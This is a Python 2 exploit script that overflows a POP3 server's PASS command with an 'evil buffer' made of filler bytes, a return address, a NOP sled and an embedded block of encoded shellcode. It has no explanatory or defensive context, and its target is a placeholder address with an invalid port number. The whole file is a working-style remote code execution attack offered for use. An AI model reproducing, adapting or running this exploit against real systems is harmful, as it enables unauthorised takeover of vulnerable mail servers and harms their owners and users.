#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = ("\xbf\xce\x1e\x2f\xe6\xdb\xdb\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x78\x12\x83\xc0\x04\x03\xb6\x10\xcd\x13\xba\xc5\x93"
"\xdc\x42\x16\xf4\x55\xa7\x27\x34\x01\xac\x18\x84\x41\xe0\x94"
"\x6f\x07\x10\x2e\x1d\x80\x17\x87\xa8\xf6\x16\x18\x80\xcb\x39"
"\x9a\xdb\x1f\x99\xa3\x13\x52\xd8\xe4\x4e\x9f\x88\xbd\x05\x32"
"\x3c\xc9\x50\x8f\xb7\x81\x75\x97\x24\x51\x77\xb6\xfb\xe9\x2e"
"\x18\xfa\x3e\x5b\x11\xe4\x23\x66\xeb\x9f\x90\x1c\xea\x49\xe9"
"\xdd\x41\xb4\xc5\x2f\x9b\xf1\xe2\xcf\xee\x0b\x11\x6d\xe9\xc8"
"\x6b\xa9\x7c\xca\xcc\x3a\x26\x36\xec\xef\xb1\xbd\xe2\x44\xb5"
"\x99\xe6\x5b\x1a\x92\x13\xd7\x9d\x74\x92\xa3\xb9\x50\xfe\x70"
"\xa3\xc1\x5a\xd6\xdc\x11\x05\x87\x78\x5a\xa8\xdc\xf0\x01\xa5"
"\x11\x39\xb9\x35\x3e\x4a\xca\x07\xe1\xe0\x44\x24\x6a\x2f\x93"
"\x4b\x41\x97\x0b\xb2\x6a\xe8\x02\x71\x3e\xb8\x3c\x50\x3f\x53"
"\xbc\x5d\xea\xf4\xec\xf1\x45\xb5\x5c\xb2\x35\x5d\xb6\x3d\x69"
"\x7d\xb9\x97\x02\x14\x40\x70\x27\xe2\x4a\xcf\x5f\xf6\x4a\xce"
"\x24\x7f\xac\xba\x4a\xd6\x67\x53\xf2\x73\xf3\xc2\xfb\xa9\x7e"
"\xc4\x70\x5e\x7f\x8b\x70\x2b\x93\x7c\x71\x66\xc9\x2b\x8e\x5c"
"\x65\xb7\x1d\x3b\x75\xbe\x3d\x94\x22\x97\xf0\xed\xa6\x05\xaa"
"\x47\xd4\xd7\x2a\xaf\x5c\x0c\x8f\x2e\x5d\xc1\xab\x14\x4d\x1f"
"\x33\x11\x39\xcf\x62\xcf\x97\xa9\xdc\xa1\x41\x60\xb2\x6b\x05"
"\xf5\xf8\xab\x53\xfa\xd4\x5d\xbb\x4b\x81\x1b\xc4\x64\x45\xac"
"\xbd\x98\xf5\x53\x14\x19\x15\xb6\xbc\x54\xbe\x6f\x55\xd5\xa3"
"\x8f\x80\x1a\xda\x13\x20\xe3\x19\x0b\x41\xe6\x66\x8b\xba\x9a"
"\xf7\x7e\xbc\x09\xf7\xaa")

buffer = "A"*2606 +"\x8f\x35\x4A\x5F" + "\x90" * 16 + shellcode + "C"* (3500-2606-4-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(('0.0.0.0',9999999999))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
